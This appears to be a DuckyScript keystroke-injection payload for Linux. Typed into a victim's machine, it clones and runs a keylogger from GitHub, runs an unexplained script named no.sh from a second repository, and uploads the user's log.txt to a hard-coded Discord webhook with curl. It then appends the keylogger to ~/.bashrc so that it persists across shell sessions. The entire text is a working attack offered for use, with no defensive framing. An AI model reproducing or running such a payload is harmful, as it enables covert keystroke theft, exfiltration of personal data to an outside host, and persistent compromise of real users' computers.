DELAY 1000
STRING git clone https://github.com/dad1x/Keylogger.git
ENTER
DELAY 1000
CTRL ALT t
DELAY 1000
STRING cd ~/Keylogger
ENTER
DELAY 1000
STRING cd linux 
ENTER
STRING pip3 install -r requirements.txt
ENTER
DELAY 1000
STRING chmod +x keylogger.py
ENTER
DELAY 1000
STRING ./keylogger.py
ENTER
CTRL ALT t
DELAY 1000
STRING git clone https://github.com/dad1x/its_villain 
ENTER
DELAY 1000
STRING cd its_villain
ENTER
DELAY 1000
STRING chmod +x no.sh
ENTER
DELAY 1000
STRING ./no.sh
ENTER
DELAY 1000
STRING curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
ENTER
DELAY 1000
STRING echo "python3 /home/$USER/Keylogger/linux/keylogger.py &" >> ~/.bashrc
